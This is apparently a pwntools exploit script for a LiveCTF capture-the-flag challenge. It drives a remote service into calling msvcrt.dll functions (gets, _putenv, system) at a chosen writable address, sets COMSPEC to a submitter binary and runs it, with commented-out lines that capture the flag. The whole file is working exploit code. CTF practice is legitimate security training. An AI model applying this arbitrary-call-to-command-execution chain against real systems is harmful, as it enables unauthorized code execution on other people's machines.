#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


io = remote(HOST, int(PORT))
print(io.recvuntil(b"?\r\n", drop=False))
io.send(b"msvcrt.dll\r\n")
print(io.recvuntil(b"?\r\n", drop=False))
io.send(b"gets\r\n")
print(io.recvuntil(b"?\r\n", drop=False))
rw_addr = 0x140017010
io.send(f"{rw_addr}\r\n")
io.send("comspec=/home/livectf/submitter\r\n")

print(io.recvuntil(b"?\r\n", drop=False))
io.send(b"msvcrt.dll\r\n")
print(io.recvuntil(b"?\r\n", drop=False))
io.send(b"_putenv\r\n")
print(io.recvuntil(b"?\r\n", drop=False))
io.send(f"{rw_addr}\r\n")

print(io.recvuntil(b"?\r\n", drop=False))
io.send(b"msvcrt.dll\r\n")
print(io.recvuntil(b"?\r\n", drop=False))
io.send(b"system\r\n")
print(io.recvuntil(b"?\r\n", drop=False))
io.send(f"{rw_addr}\r\n")

print(io.recvall(1))


# print(io.sendlineafter("?", "msvcrt.dll"))
# print(io.sendlineafter("?", "system"))

# print(io.sendlineafter("?", f"{rw_addr}"))

# io.interactive()
# flag = io.recvline_contains(b'LiveCTF{').decode().strip()
# io.close
# print(f'Flag: {flag}')
